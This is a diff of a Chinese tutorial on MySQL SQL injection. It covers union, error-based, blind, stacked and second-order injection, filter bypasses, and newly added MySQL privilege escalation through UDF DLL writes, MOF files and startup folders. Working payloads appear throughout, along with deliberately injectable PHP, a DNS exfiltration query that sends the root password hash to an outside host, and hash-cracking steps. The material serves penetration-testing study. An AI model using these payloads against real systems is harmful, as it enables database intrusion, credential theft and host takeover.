@@ -1,4 +1,4 @@
-## 注释
+# 注释
 
 1. 行间注释
 
@@ -77,9 +77,9 @@ if ($result->num_rows !== 0) {
 
 ![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203011612543.png)
 
-## 常用注入手段
+# 常用注入手段
 
-### 联合查询注入
+## 联合查询注入
 
 联合查询注入即在原有的查询语句中,通过`union`拼接传入的恶意语句,达到获取数据的目的(常用于有回显的情况)
 
@@ -95,13 +95,13 @@ if ($result->num_rows !== 0) {
 
 若仅回显一行数据则需要将部分`column_name`设置为空
 
-### 报错注入
+## 报错注入
 
 mysql在报错信息里可能会带有部分数据,利用这一特性进行注入,但要注意数据外带的长度限制
 
 报错注入主要有以下几种
 
-#### 数据类型溢出
+### 数据类型溢出
 
 在mysql版本大于`5.5`时才会产生溢出报错
 
@@ -156,7 +156,7 @@ select !floor((select*from(select @@version)x))-~0;
 
 ![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211417654.png)
 
-#### 特殊的数学函数
+### 特殊的数学函数
 
 几何对象函数
 
@@ -181,7 +181,7 @@ select ST_PointFromGeoHash((select*from(select*from(select @@version)x)y),1);
 
 ![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211435901.png)
 
-#### xpath语法错误
+### xpath语法错误
 
 `ExtractValue()`和`UpdateXML()`
 
@@ -198,7 +198,7 @@ select extractvalue(1,concat(0x7e,(select @@version),0x7e));
 
 ![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211521265.png)
 
-#### 重复数据报错
+### 重复数据报错
 
 主键具有唯一性,主键重复则会报错
 
@@ -396,7 +396,7 @@ select * from(select * from table1 as a join table1 as b using (id))c;
 select * from(select * from table1 as a join table1 as b using (id,username))c;
 ```
 
-#### 调用不存在的函数可读取数据库名字
+### 调用不存在的函数可读取数据库名字
 
 ```
 select misaka();
@@ -405,7 +405,7 @@ select misaka();
 
 ![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201212343727.png)
 
-#### GTID函数
+### GTID函数
 
 ![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201242037203.png)
 
@@ -429,7 +429,7 @@ select * from table1 where id='1' or gtid_subtract((select group_concat(username
 (1772, "Malformed GTID set specification 'admin,tim,mike,mike'.")
 ```
 
-#### JSON函数
+### JSON函数
 
 据说有版本限制,未进行验证(当前测试版本为`5.7.11`)
 
@@ -456,7 +456,7 @@ select json_set(user(),1,2);
 (3141, 'Invalid JSON text in argument 1 to function json_set: "Invalid value." at position 0 in \'root@192.168.241.1\'.')
 ```
 
-#### UUID
+### UUID
 
 版本限制(大于`8.0`)
 
@@ -471,7 +471,7 @@ select bin_to_uuid(user())
 (1411, "Incorrect string value: 'root@192.168.241.1' for function bin_to_uuid")
 ```
 
-### 布尔注入
+## 布尔注入
 
 服务器根据sql语句的执行结果返回`success`或者是`fail`,通过构造语句利用服务器的返回值来判断数据是否符合预期
 
@@ -513,7 +513,7 @@ select * from table3 where id='1' and mid((select group_concat(info) from table3
 Time: 0.010s
 ```
 
-### 延时注入
+## 延时注入
 
 构造延时注入语句,根据服务器响应时间判断数据是否符合预期,常用于盲注
 
@@ -743,13 +743,58 @@ mysql root@localhost:sql_injection_test> select rpad((select group_concat(userna
 Time: 0.008s
 ```
 
-### 堆叠注入
+## 堆叠注入
 
 即多语句执行,例题可以参照sqli-labs的Less-38
 
->todo pdo多语句执行
+PDO默认支持多语句查询,如果php版本小于5.5.21或者创建PDO实例时未设置`PDO::MYSQL_ATTR_MULTI_STATEMENTS`为`false`时可能会造成堆叠注入
 
-### 二次注入
+```php
+<?php
+$dbms='mysql';
+$host='172.17.0.1';
+$port=4000;
+$dbName='test';
+$user='root';
+$pass='root';
+$dsn="$dbms:host=$host;port=$port;dbname=$dbName";
+try {
+    $pdo = new PDO($dsn, $user, $pass);
+} catch (PDOException $e) {
+    echo $e;
+}
+$sql = "select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA";
+$stmt = $pdo->query($sql);
+while($row=$stmt->fetch(PDO::FETCH_ASSOC))
+{
+    var_dump($row);
+}
+echo "<br>";
+
+
+$id = $_GET['id'];
+$sql = "SELECT * from users where id =".$id;
+$stmt = $pdo->query($sql);
+while($row=$stmt->fetch(PDO::FETCH_ASSOC))
+{
+    var_dump($row);
+}
+echo "<br>";
+
+$sql = "select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA";
+$stmt = $pdo->query($sql);
+while($row=$stmt->fetch(PDO::FETCH_ASSOC))
+{
+    var_dump($row);
+}
+echo "<br>";
+```
+
+![](https://img.mi3aka.eu.org/2022/09/698fd7877db687c5839ed827c36bbefc.png)
+
+![](https://img.mi3aka.eu.org/2022/09/acb6040c6785b39d93b70e075f1e060b.png)
+
+## 二次注入
 
 攻击者构造的恶意数据在数据库语句执行前进行了转义操作,但是服务器在从数据库中取出数据时没有进行相应的转义操作,导致了后续在进行语句拼接时产生的SQL注入问题
 
@@ -802,9 +847,9 @@ public function list_email()
 
 在注册过程中,由于存在`mysqli_real_escape_string`,敏感字符会被转义后再执行sql语句,但是从数据库取出`username`后,并没有执行相应的`mysqli_real_escape_string`,因此`SELECT email,time FROM email where username = '$username'`会变成`SELECT email,time FROM email where username = '' or 1#'`因此造成了二次注入
 
-## 注入技巧
+# 注入技巧
 
-### order by注入
+## order by注入
 
 `SELECT`语句使用`ORDER BY`子句将查询数据排序后再返回数据
 
@@ -976,6 +1021,12 @@ mysql root@localhost:sql_injection_test> select * from table1 order by if(length
 (1242, 'Subquery returns more than 1 row')
 ```
 
+`order by if((select ascii(substr(@@version,1,1)))>100,1,(select 1 union select 2))`
+
+[记一次真实渗透排序处发现的SQL注入学习](https://www.freebuf.com/articles/web/338744.html)
+
+![](https://img.mi3aka.eu.org/2022/09/97c83b3db2779f3fcffb6fdd69cdc061.png)
+
 4. 利用updatexml等进行报错注入
 
 ```
@@ -1092,7 +1143,7 @@ mysql root@localhost:sql_injection_test> select username,password from table1 wh
 Time: 0.008s
 ```
 
-### limit注入
+## limit注入
 
 1. 有`order by`
 
@@ -1118,6 +1169,16 @@ mysql root@localhost:mysql> select * from user order by host limit 0,1 procedure
 延时注入,这里不能用`sleep`
 
 `select * from user order by host limit 0,1 PROCEDURE analyse(updatexml(1,IF((select mid(user(),1,1)='r'),BENCHMARK(100000000,1+1),1),1),1)`
+
+---
+
+>判断列数,未验证版本范围
+
+`select * from test.users order by 1 limit 0,1 into @a,@b,@c,@d;`
+
+当列数与`@`的数量相同时,sql语句才能够正常执行,利用这一点可以获取列的数量
+
+![](https://img.mi3aka.eu.org/2022/09/9f496313d87adf9e9e6074bb664d5acd.png)
 
 2. 无`order by`
 
@@ -1167,7 +1228,7 @@ mysql root@localhost:mysql> (select host from user limit 0,1) union (select user
 Time: 0.008s
 ```
 
-### between and注入
+## between and注入
 
 `between and`可以`=,<,>,like,regexp`被过滤的情况下使用
 
@@ -1356,7 +1417,7 @@ mysql root@localhost:sql_injection_test> select * from table1 where id='-1' or i
 Time: 0.008s
 ```
 
-### 文件读写
+## 文件读写
 
 `file_priv`是表示用户的文件读写权限,查询方式`select file_priv,host,user from mysql.user`
 
@@ -1419,7 +1480,7 @@ mysql root@localhost:(none)> show variables like "secure_file_priv";
 Time: 0.012s
 ```
 
-#### 读文件
+### 读文件
 
 `select load_file("/etc/passwd")`路径必须是绝对路径,同时要注意文件大小限制
 
@@ -1720,7 +1781,7 @@ asyncore.loop()
 
 ![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204231544750.png)
 
-#### 写文件
+### 写文件
 
 `select "payload" into outfile/dumpfile 'filename'`路径必须是绝对路径
 
@@ -1818,7 +1879,7 @@ Time: 0.008s
 
 ![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202021353680.png)
 
-### dnslog外带数据
+## dnslog外带数据
 
 只能够在windows上进行,利用了windows的[UNC](https://docs.microsoft.com/en-us/dotnet/standard/io/file-path-formats#unc-paths)
 
@@ -1886,7 +1947,7 @@ Time: 22.297s
 
 `SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM mysql.user WHERE user='root' LIMIT 1),'.mysql.ip.port.b182oj.ceye.io\\abc'));`
 
-### 字符集漏洞
+## 字符集漏洞
 
 [Mysql-字符集漏洞分析](https://lalajun.github.io/2018/05/11/mysql-%E5%AD%97%E7%AC%A6%E9%9B%86%E6%BC%8F%E6%B4%9E/)
 
@@ -1915,7 +1976,7 @@ character_set_system
 
 进入具体表和字段后,再转换成字段对应的编码,当查询结果产生后,会从表和字段的编码,转换成`character_set_results`编码,返回给客户端
 
-#### GBK编码注入
+### GBK编码注入
 
 php编码为`UTF-8`而mysql编码为`gbk`,在php向mysql传递数据时会产生编码转换从而导致注入
 
@@ -2035,7 +2096,7 @@ var_dump($result->fetch_all());
 
 ![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202031352322.png)
 
-#### iconv
+### iconv
 
 在使用`iconv`进行编码转换时会产生注入
 
@@ -2138,7 +2199,7 @@ var_dump($result->fetch_all());
 
 ![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202031441844.png)
 
-#### latin1编码注入
+### latin1编码注入
 
 [Mysql字符编码利用技巧](https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html)
 
@@ -2191,7 +2252,7 @@ var_dump($result->fetch_all());
 
 因此只有`[7F-C0]`中的部分字符可以被利用
 
-### 约束攻击
+## 约束攻击
 
 >利用mysql对空格的特殊处理来进行平行越权
 
@@ -2314,7 +2375,7 @@ mysql root@localhost:sql_injection_test> select * from `user`;
 Time: 0.008s
 ```
 
-### 无列名注入
+## 无列名注入
 
 1. union
 
@@ -2478,15 +2539,27 @@ mysql root@localhost:sql_injection_test> select (select 'abc')=substr((select * 
 Time: 0.008s
 ```
 
-### insert update delete注入
+## insert update delete注入
 
 与`select`不同,没有数据直接回显,通常结合报错注入或延时注入
 
 >insert注入会产生大量垃圾数据,delete注入要注意防止条件为永真
 
-## 过滤与替换
+### update注入技巧
 
-### information_schema被过滤
+```
+use test;
+UPDATE users set name='admin',password=(select @@version) where id=1;
+select * from users;
+UPDATE users set name='admin',password=(select user()) where id=1;
+select * from users;
+```
+
+![](https://img.mi3aka.eu.org/2022/09/9fff0c5654b31bb0e62e062f88ff1ded.png)
+
+# 过滤与替换
+
+## information_schema被过滤
 
 >某些表需要权限才能访问
 
@@ -2506,7 +2579,7 @@ Time: 0.008s
 
 8. `mysql.innodb_table_stats`
 
-### and与or被过滤
+## and与or被过滤
 
 - 用`&&`和`||`代替
 
@@ -2526,7 +2599,7 @@ select id,username,password from users where id=1^updatexml(1,concat(0x7e,(selec
 
 ![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203241442340.png)
 
-### 空格被过滤
+## 空格被过滤
 
 - 用`/*xxx*/`或者`+`(加号有使用限制)作为空格的替换
 
@@ -2607,7 +2680,7 @@ for i in url_char:
 
 ![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203241431617.png)
 
-### 逗号被过滤
+## 逗号被过滤
 
 `select 1,2,3;`
 
@@ -2711,7 +2784,7 @@ mysql root@localhost:(none)> select user,host,file_priv from mysql.user where us
 Time: 0.010s
 ```
 
-### if被过滤
+## if被过滤
 
 使用`case when 条件 then 表达式1 else 表达式2 end`进行替换
 
@@ -2726,7 +2799,7 @@ select id,username,password from users where username='asdf' and case when lengt
 
 ![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203241505008.png)
 
-### 数字被过滤
+## 数字被过滤
 
 [MySQL注入技巧](https://wooyun.js.org/drops/MySQL%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7.html)
 
@@ -2747,7 +2820,7 @@ floor(version()+pi()) 8     ceil(pi()*version())+true 18 I      ceil(pi()*pi()*p
 floor(pi()*pi())      9     floor((pi()+pi())*pi())   19 J      floor(pi()*pi()*floor(pi())) 29 T
 ```
 
-### 比较操作符/函数
+## 比较操作符/函数
 
 ```
 <
@@ -2762,7 +2835,7 @@ rlike
 regexp
 ```
 
-### 报错注入时concat被过滤
+## 报错注入时concat被过滤
 
 在某一次渗透测试时,遇到了`concat`被过滤的情况,但不是单纯地过滤`concat`关键字,而是对`concat(xxx,xxx)`此种形式进行过滤
 
@@ -2808,4 +2881,102 @@ bits将转为二进制,2的二进制为0000 0011,所以输出`a,b`
 
 `resetPassword?mobile=13610001000'and+updatexml(1,rpad('~',30,(select version())),1)%23`
 
-## 未完待续...
+# 提权利用
+
+[MySQL 漏洞利用与提权](https://www.sqlsec.com/2020/11/mysql.html)
+
+## 读取mysql.user中的哈希
+
+```
+mysql<=5.6
+select Host,User,Password from mysql.user;
+mysql>=5.7
+select Host,User,authentication_string from mysql.user;
+```
+
+![](https://img.mi3aka.eu.org/2022/09/86d44221183ba3ecf9591c3cbf73541e.png)
+
+![](https://img.mi3aka.eu.org/2022/09/f7ba4f9de28b345e3fe93fc2662a12d8.png)
+
+去cmd5反查
+
+![](https://img.mi3aka.eu.org/2022/09/a7f6cc20502932a4eb0fdef0a8d6575b.png)
+
+## UDF提权
+
+[MySQL UDF 提权十六进制查询](https://www.sqlsec.com/udf/)
+
+>UDF(user defind function)用户自定义函数,通过添加新函数,对MySQL的功能进行扩充
+
+1. 判断是否有写入权限
+
+`show variables like '%priv%';`
+
+![](https://img.mi3aka.eu.org/2022/09/ef4c556ad923ceb758f0073f9ea20fd4.png)
+
+![](https://img.mi3aka.eu.org/2022/09/219fe392d725695636419fd91c0feb28.png)
+
+高版本的mysql会默认限制文件读写
+
+2. 寻找插件目录
+
+`show variables like '%plugin%';`
+
+![](https://img.mi3aka.eu.org/2022/09/8ebb4562eb8f09f5560a31acb4f6303a.png)
+
+3. 利用十六进制写入文件
+
+![](https://img.mi3aka.eu.org/2022/09/467942ff004b62cb14d3319a9990e7d8.png)
+
+![](https://img.mi3aka.eu.org/2022/09/55b29cc2bab8342acc50f1486c45eb98.png)
+
+`SELECT 0x4d5a90000..000 INTO DUMPFILE 'C:\\MYSQL\\mysql-5.5.44\\lib\\plugin\\udf.dll';`
+
+4. 创建自定义函数并调用命令
+
+`CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.dll';`
+
+`select * from mysql.func`
+
+`select sys_eval('whoami');`
+
+![](https://img.mi3aka.eu.org/2022/09/166f09e53dfc9000101f9f4d04f06476.png)
+
+![](https://img.mi3aka.eu.org/2022/09/f8d43d6c7c54dc5295c123f27e9b218d.png)
+
+成功创建并调用
+
+5. 删除自定义函数
+
+`drop function sys_eval;`
+
+## MOF提权
+
+一般来说在windows server 2003上才能成功
+
+提权的原理是`C:/Windows/system32/wbem/mof/`目录下的`mof`文件每隔一段时间都会被系统执行,利用文件中含有的`vbs`脚本来执行系统命令
+
+## 启动项提权
+
+向启动项目录中写入`vbs`或者`exe`文件,在用户登录/重启后执行
+
+```
+Windows Server 2003
+# 中文系统
+C:\Documents and Settings\Administrator\「开始」菜单\程序\启动
+C:\Documents and Settings\All Users\「开始」菜单\程序\启动
+
+# 英文系统
+C:\Documents and Settings\Administrator\Start Menu\Programs\Startup
+C:\Documents and Settings\All Users\Start Menu\Programs\Startup
+
+# 开关机项 需要自己建立对应文件夹
+C:\WINDOWS\system32\GroupPolicy\Machine\Scripts\Startup
+C:\WINDOWS\system32\GroupPolicy\Machine\Scripts\Shutdown
+
+Windows Server 2008
+C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
+```
+
+# 未完待续...
